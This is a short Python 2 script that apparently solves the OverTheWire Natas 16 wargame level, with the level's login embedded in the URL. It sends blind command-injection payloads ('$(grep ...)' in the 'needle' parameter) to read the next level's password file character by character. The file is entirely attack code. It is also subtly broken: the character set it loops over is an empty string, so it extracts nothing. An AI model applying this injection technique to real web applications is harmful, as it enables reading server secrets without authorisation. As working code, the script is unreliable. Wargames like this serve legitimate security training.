import requests

password = ""
url = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/'
allChars = ""
parsedChars = ""
allowedChars = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "R", "S", "T", "U",
                     "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]

password = ''
# Target URL
target = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/'
existsStr = 'Output:\n<pre>\n</pre>'

r = requests.get(target)
if r.status_code != requests.codes.ok:
    raise ValueError('Kabum? Couldn\'t connect to target :(')
else:
    print 'Target reachable. Starting character parsing...'


for c in allChars:
    # Command injection #1
    r = requests.get(target+'?needle=$(grep '+c +
                     ' /etc/natas_webpass/natas17)whacked')
    if r.content.find(existsStr) != -1:
        parsedChars += c
        print 'Used chars: ' + parsedChars


for i in range(32):
    for c in parsedChars:
        r = requests.get(
            target+'?needle=$(grep ^'+password+c+' /etc/natas_webpass/natas17)whacked')
        if r.content.find(existsStr) != -1:
            password += c
            print 'Password: ' + password + \
                '*' * int(32 - len(password))
            break

print 'Done!'
